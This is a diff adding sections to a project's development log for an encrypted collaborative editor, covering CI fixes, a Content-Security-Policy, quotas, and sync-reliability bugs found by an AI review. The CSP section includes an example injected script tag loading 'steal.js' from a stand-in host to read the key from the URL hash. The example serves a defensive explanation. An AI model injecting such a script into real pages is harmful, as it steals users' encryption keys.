@@ -839,6 +839,99 @@ likely thing to be wrong. Verify the harness before changing the code.
   to `10.0.5`. The CI audit gate caught this automatically, which is the first
   real proof that gate earns its keep.
 
+  **Later, and this time the upgrade is what broke it.** `shell-quote@1.8.4` -
+  `1.10.0` carries a critical command-injection advisory, and `concurrently` gained a
+  dependency on the vulnerable range in 9.2.3. So the "fix" moved the project from
+  vulnerable to _also_ vulnerable, and `npm audit --audit-level=high` exited 1 - which
+  means CI's `security` job was red and had been for a while.
+
+  The audit did not notice because `npm audit` has nothing to say about the fact that
+  the gate was red; nobody ran it locally before pushing.
+
+  The fix was to **delete `concurrently`**, not to downgrade it. It was used for exactly
+  one thing: running the API and the Vite dev server side by side with their output
+  labelled. That is thirty lines, and it removes four transitive packages instead of
+  pinning one of them to a version that happens not to be affected. `scripts/dev.mjs`
+  keeps the behaviours people rely on - per-child labels, Ctrl+C stopping both, one
+  exiting taking the other down.
+
+  The first version of `dev.mjs` used `shell: true` to spawn `npm` on Windows, and Node
+  emitted DEP0190 about passing arguments to a shell - the exact hazard the dependency was
+  removed for. The shell is now avoidable: `npm_execpath` names the npm-cli.js that is
+  running, and invoking it with the same Node is both exact and shell-free.
+
+  **The lesson is not "always upgrade".** It is that a dependency can be fixed into a new
+  vulnerability, and that a red security gate is only noticed by running the gate.
+
+- **The first CI run ever found a bug the local suite could not.**
+  `npx playwright install --with-deps --no-shell chromium` installs the full
+  Chromium and _excludes_ `chromium_headless_shell` - which is what
+  Playwright's default `headless: true` launches since 1.49. All six browser
+  tests failed in CI with `Executable doesn't exist at
+.../chromium_headless_shell-1243/chrome-headless-shell`.
+
+  **The local suite could not have caught this, and that is the point.** A
+  developer machine that has ever run a plain `npx playwright install` has
+  both binaries. It passes whichever one the config picks. CI installs one.
+  The local green and the CI red were both correct about their own machine;
+  there was no bug to reproduce until the two environments were made to
+  differ deliberately.
+
+  Reproduced before fixing, by renaming the local `chromium_headless_shell`
+  directory so the machine matched CI exactly. Confirmed the failure, then
+  added `channel: 'chromium'` to `playwright.config.ts` and confirmed all six
+  pass in that same state.
+
+  Chose `channel: 'chromium'` over removing `--no-shell` from CI: CI's
+  installed browser then matches what the tests launch, no ~50 MB binary is
+  downloaded that nothing runs, and the full build is real headless Chrome
+  rather than a stripped harness - so the CI run is closer to what a user's
+  browser does.
+
+  **The generalisable mistake: a passing local suite proves the code works on
+  the machine it ran on.** It says nothing about whether the _declared_
+  environment can run it. T1 shipped a browser job that had never executed,
+  and the reason it looked green is that the job did not exist yet.
+
+- **The outage scenarios were asserting against a server that was still
+  running.** `stopServer()` waited for `/api/health` to stop answering, which
+  `server.close()` makes true the moment it stops accepting - long before the
+  process ends. The scenarios then typed into a server that was still alive,
+  which accepted and acknowledged the operations, so the indicator correctly
+  read `Synced` and the peer count correctly read `2 collaborators`.
+
+  The test's premise was false, and the failure named neither the cause nor
+  the real one. `stopServer()` now waits for the **process** to exit, escalating
+  to SIGKILL and then throwing with the pid if it will not.
+
+  **This is why it never failed locally, and the reason is worth more than the
+  bug:** on Windows `process.kill(pid, 'SIGTERM')` calls `TerminateProcess`.
+  The process dies at once and _cannot run its shutdown handler at all_. So the
+  graceful shutdown path in `src/server/index.ts` has never executed on any
+  developer machine, and the old health check was accidentally accurate on
+  Windows precisely because shutdown never happens there.
+
+  Verified by making `shutdown()` hang and confirming the sabotage never
+  appeared in the log - no handler ran, because none could.
+
+  Linux is the only place that code has run. The one time it did, it took
+  **more than 45 seconds**: `shutting down` at 16:50:14, still alive at
+  16:50:59. Docker's default stop timeout is 10s and systemd's is 90s, so on
+  the evidence available `docker stop` would SIGKILL this server mid-drain and
+  `db.close()` would never complete.
+
+  **NOT FIXED, and deliberately so.** It has been observed once in a log, not
+  reproduced, and reworking shutdown ordering is much larger than a test fix. It
+  is written down here and in `e2e/global-setup.ts` so it survives, and it
+  belongs with the deploy work.
+
+  Five wrong theories came before the right one. Four candidate causes were
+  measured and falsified on Windows first - an open keep-alive connection, an
+  open WebSocket, an admitted client with 40 real operations written, a TCP
+  connection that never sends a request, and 6,000 operations in flight. Every
+  one exited in 20-25ms. The fourth of those was the one I was about to commit
+  as a server fix, which is the argument for reproducing before changing code.
+
 ### Test suite
 
 106 tests, ~2 minutes. The runtime is dominated by Postgres initialisation
@@ -846,6 +939,138 @@ likely thing to be wrong. Verify the harness before changing the code.
 2's fuzz test will likely force revisiting that.
 
 ---
+
+## A policy, and what it was protecting
+
+The end-to-end encryption key is in the URL fragment: `/?doc=<id>#k=<key>`. The server never sees
+it, which is the whole reason that design works. But a fragment is not a secret from the page,
+and the key is exactly one `location.hash` away from any script running in the tab.
+
+There is no HTML-injection sink today. The new `Content-Security-Policy` is the net for the day
+one appears: it does not stop an injection, it decides what an injected script may then load
+and exfiltrate. Without `script-src`, an injected `<script src="https://elsewhere/steal.js">`
+runs and reads the key out of the hash. With `script-src 'self'`, it is refused.
+
+`frame-ancestors 'none'` and `X-Frame-Options: DENY` are the same kind of net: without either,
+any site can frame the editor and overlay invisible UI on it.
+
+Two decisions worth recording:
+
+1. **`script-src` gets neither `'unsafe-inline'` nor `'unsafe-eval'`, ever.** `style-src` does
+   get `'unsafe-inline'`, because CodeMirror injects a `<style>` element at runtime - verified by
+   reading the built bundle, and confirmed empirically when removing it made all six browser
+   scenarios fail with `style-src-elem blocked inline`. A style cannot execute, so that is a
+   different risk. A policy that allowed inline script would not be a weaker version of this
+   protection; it would be the absence of it.
+
+2. **No HSTS in the application.** It is a promise about an origin's whole lifetime, and only
+   the party terminating TLS can keep it. Sending it from a process that listens on plain HTTP
+   means locking out any client that reaches the origin directly. It belongs to the proxy, and
+   `docs/deploy.md` now says so.
+
+`CSP_MODE` defaults to `enforce`, which is only defensible because the browser tests confirm
+zero violations across all six scenarios. It takes `report-only` for changing the policy, and
+falls back to `enforce` on any unrecognised value: a typo in an environment variable should not
+be able to silently leave a deployment unprotected.
+
+## Quotas, and the two places a limit can be wrong
+
+One row is stored per character, and an anonymous session costs nothing, so the only limit
+anywhere was MAX_CREATE_PER_HOUR = 60. Four numbers now bound the rest. The defaults were chosen
+so that nothing legitimate trips them, and that claim - not the arithmetic - is what is tested:
+`limits.e2e.test.ts` pushes a 12,000-operation offline flush through a real relay at the shipped
+defaults and requires it to arrive whole. If that test ever fails, the number is wrong, not the test.
+
+Three things turned out to matter more than the numbers:
+
+1. **At the document cap, deletion still works.** Refusing tombstones as well as inserts would
+   leave a full document with no way to empty it, which turns a quota into a dead end. The rule
+   counts inserts only. This is only possible because `EncryptedOperationFrame.type` is
+   cleartext - a shape that had to be chosen earlier, for a rule written later.
+
+2. **Neither quota code is on the client's list of permanent refusals.** For
+   DOCUMENT_TOO_LARGE the obvious answer is wrong. The refusal genuinely cannot be retried away,
+   so "a retry cannot fix it, therefore stop" reads as correct - but the user's only route out of
+   a full document is to delete from it, and deletion needs a live connection. A client that
+   refused to reconnect would strand anyone who filled a document. Both are reported loudly and
+   reconnect with jittered backoff. I wrote the test asserting the opposite first, watched it
+   fail, and then worked out that the test was wrong rather than the code.
+
+3. **A Prometheus counter that has never been incremented renders nothing.** Not `0` - nothing.
+   No HELP, no TYPE, no sample. Two assertions I wrote (`toBe(0)` in a test, "is the counter
+   declared" in the smoke script) were both asserting facts this registry cannot produce, and
+   both failed for reasons that had nothing to do with the limits. "Could not check" and
+   "nothing happened" must never look the same, which is now the subject of two explicit tests.
+
+Three of my own test bugs, all arithmetic, none of them the product's:
+
+- the reconnect test sent 1,000 operations against a burst of 500 and expected success; a single
+  frame larger than the burst is refused on any connection, new or not
+- the encrypted test sent 4 frames against a burst of 10, so it was never near the limit
+- the flush test slept one second and then asserted a count; at one second 4,000 of 12,000 had
+  arrived, which would have made it a coin flip on machine speed. It polls now.
+
+Also: `scripts/env-example.test.ts` finds environment variables by searching source for two
+specific access shapes, so a computed `env[name]` is invisible to it and the gate correctly
+reported four documented-but-unread variables. Naming each one literally is worth the four
+repetitions.
+
+## "Synced" was a claim about the local socket
+
+`SyncTransport` emptied its outbox the moment `ws.send()` returned, and nothing in the protocol
+ever confirmed a write. `send()` returning says the operating system accepted the bytes. It says
+nothing about the server having read them, and less about the server having stored them.
+
+So a frame written to a socket that then died was gone from memory and had arrived nowhere.
+Measured, not hypothesised, with a real relay and a real database and the shipped client, killing
+the socket between "frame received" and "frame committed":
+
+```
+AssertionError: the resend never reached the server, so the edits were lost: expected '' to be 'xx'
+```
+
+An empty document, and an indicator reading `Synced` - because `Synced` was derived from the outbox
+being empty, and the outbox had just been emptied. That is the whole bug in one line: a UI state
+defined in terms of an event that had already happened locally.
+
+**The fix.** A client that wants confirmation puts a `batchId` on its frame. The server sends
+`{type:'ack', batchId}` after the store settles, and sends nothing if the store failed. The client
+keeps an in-flight list beside the outbox: an operation leaves the outbox when it is WRITTEN and
+leaves the in-flight list when it is ACKNOWLEDGED. On reconnect, in-flight frames go back to the
+front of the outbox in order and are replayed. `Synced` now means both lists are empty.
+
+Three things in there are not obvious:
+
+1. **The ack follows the store, not the socket.** An ack sent when the frame is read would fix
+   nothing at all - the failure being fixed is precisely a frame the relay had in hand and lost -
+   and it would make every other test pass while leaving the data loss intact. `relayAck.test.ts`
+   asserts on ordering, not on presence, for exactly this reason.
+
+2. **`batchId` is optional, and that is why no version bump.** An old client sends no id, so the
+   server acknowledges nothing and it never receives an `ack`. Had the server acknowledged
+   unconditionally, every deployed client would have hit its "unrecognised frame" handler and
+   shown an error on every keystroke. Bumping `PROTOCOL_VERSION` instead would have failed every
+   deployed client's `hello` outright - trading silent data loss for a total outage.
+
+3. **Encrypted frames are replayed verbatim, never re-encrypted.** The nonce is already committed
+   to; encrypting again would produce a different ciphertext for the same elements and the server
+   would store both. So the in-flight list holds whole frames, not operations.
+
+What this costs, recorded because it is real: a lost _ack_ causes a redundant write, because the
+client cannot tell "stored" from "stored but unacknowledged" and has to assume the worst. That is
+only safe because persistence is idempotent, which `writeDurability.test.ts` measures rather than
+assumes - it produces the stored-but-unacknowledged case on purpose and checks the document still
+holds two characters and not four.
+
+Still not fixed, and it is the next thing that matters: the protocol has **no application-level
+ping**. Everything above depends on the socket's `close` event arriving. A half-open connection
+that silently drops packets is not noticed by either side, and no amount of resend helps a client
+that does not know it is stuck.
+
+Also of note, from building the tests: the first version of the integration test asserted the
+_buggy_ behaviour, on the reasoning that documenting the current state has some value. It would
+have broken the moment the bug was fixed, at which point it would have been arguing with the fix
+instead of guarding it. The proof is the failing output, not a test that enshrines it.
 
 ## Log
 
@@ -1584,5 +1809,107 @@ Open the application on day one, not at the end. Every one of these four was a *
 - two correct halves not connected to each other - and wiring is only observable from above the
   unit under test. The lesson generalises past this project: a component with excellent tests can
   still be dead on arrival if nothing ever calls it.
+
+## External review: the 5,001st character, and three siblings
+
+An independent review (an AI reviewer, 6 Oct 2026) ran probes against the real server and a
+real `SyncTransport` instead of reading the code and the passing suite. Four problems were
+reproduced before anything was changed. All four had a green test suite sitting on top of them.
+
+### One paste left every other client with an empty document
+
+`SyncTransport.send` kept only the newest 5,000 queued operations. Typed text is a chain: each
+character is anchored to the one before it. Dropping the _oldest_ operations therefore left
+every survivor anchored to something the relay had never received. The relay accepted the batch
+as well formed, could not place it, and a fresh client downloaded **zero characters** - while
+the sender's indicator read "Synced", because the outbox was genuinely empty.
+
+Measured, one paste while connected: 5,000 characters converged; **5,001 did not**. Offline
+typing behaved the same above the cap. The server's own `collab_operations_unplaced_total`
+read 10,000 and then 20,000 (the surviving half of each failing run), and its help text says
+"non-zero means peers are diverging". Nothing raised an error.
+
+The comment justified the cap with "the relay only needs a reasonable tail". For a log-based
+relay that is false: it needs the whole log. The unit test asserted that the oldest operations
+were dropped, which was true, and said nothing about what the relay could then do with the
+rest. The offline e2e test never went near the cap, because it sends the whole authored log
+over a raw socket and bypasses `SyncTransport` entirely.
+
+Fixed by removing the cap (the outbox holds references to operations the replica already keeps,
+so a queued operation costs one pointer) and sending in frames of at most `MAX_OPS_PER_FRAME`.
+After the fix 4,000, 6,000 and 12,000 characters typed offline and pastes of 5,000, 5,001 and
+6,000 characters all converge, and the unplaced counter stays absent.
+
+### The ordering bug from Phase 5, still alive in the other branch
+
+The "Baseline protocol" section above records `#flushOutbox` clearing the outbox before
+`#send`, so a refused write dropped keystrokes. That was fixed for the plaintext branch. The
+encrypted branch kept the original order: it removed the batch, then wrote, under a comment
+reading "left queued on a failed write". A connection that dropped while encryption was
+running took the batch with it. Reproduced (queue length 0 where 5 was expected), fixed by
+writing first and removing only on success.
+
+The lesson is about duplicated branches, not about this line: a fix to one of two parallel
+paths is half a fix unless something tests the other.
+
+### Editor offsets count UTF-16; the CRDT counts code points
+
+An emoji is one element and two code units, so every offset after one disagreed. The local
+path passed editor offsets straight to the replica and had no check afterwards: typing after
+an emoji inserted one character too far right, and deleting an emoji deleted the character
+after it as well (two delete operations broadcast for one deletion), with zero anomalies
+reported. The remote path was wrong in the same way but failed safe, because the binding
+verifies it and falls back to a full replacement. Translation now happens at the two
+boundaries (`applyLocalEdits`, `diffVisible`); the data model and persisted operations are
+unchanged.
+
+### No limit on a WebSocket frame
+
+`ws` defaults to 100 MiB per message, and the relay parses a message before it knows who sent
+it. A 30 MB frame from a socket that never sent hello was accepted and parsed; six concurrent
+60 MB frames raised server memory by about 590 MB. `maxPayload` is now `MAX_FRAME_BYTES` (4 MiB)
+via `createRelaySocketServer`, which `index.ts` and a test both use, because every other server
+test builds its own `WebSocketServer` and nothing exercised the options production used.
+Re-measured: the same frames are closed with 1009 and memory is unchanged.
+
+### Not checked
+
+The outbox is emptied when `ws.send` returns, not when the server acknowledges. A connection
+that dies after the write but before delivery is not obviously recovered by anything. This was
+not tested and is recorded as a question, not a finding.
+
+## A browser, and what it cost to build the tests for it
+
+946 source-level tests passed while the application never once sent a typed character to the
+server. Nothing rendered the UI, so nothing could notice. Four bugs in a row lived at a seam
+between two well-tested layers, which is exactly the class a unit suite cannot see: the
+components were correct and the wiring between them was not, and the wiring is not inside any
+component.
+
+Part of this is now guarded mechanically. `e2e/` drives the real built server in Chromium, and
+`npm run test:e2e` runs it as a separate CI job so a runner problem cannot block every push.
+
+Three things were learned the hard way and are recorded in `docs/browser-tests.md`:
+
+1. **`setOffline` is not an outage.** Neither is CDP `Network.emulateNetworkConditions`, nor
+   `routeWebSocket`. All three leave an ESTABLISHED WebSocket connected in Chromium, verified by
+   confirming that operations typed while "offline" arrived at the server. A test written against
+   them passes with offline handling deleted. The specs therefore stop the server process.
+
+2. **Three coordinate systems meet at the editor.** The CRDT counts code points, CodeMirror
+   counts UTF-16 units, and `ArrowRight` steps by grapheme. The first draft of the emoji test
+   pressed the arrow key three times to get to UTF-16 offset 3 and landed one character too far,
+   and then asserted the behaviour of Delete while calling it Backspace. Both were the test being
+   wrong about the editor, not the application.
+
+3. **A green test can prove nothing.** The first version of the revert used to prove the emoji
+   scenario bites left an unused variable behind. Typecheck rejected it, the build failed, `dist/`
+   kept the patched code, and the test passed against the code it was attacking. This is the same
+   failure as the four wiring bugs above - something reported success without having been
+   exercised - and it is why the reverts are scripted and the build is checked before each run.
+
+Also worth noting for later: the protocol has no application-level ping, so a half-open socket
+that drops packets rather than being refused would not be noticed promptly by either side. The
+outage tests cover a stopped server, which is a TCP RST, and not that case.
 
 ## Log
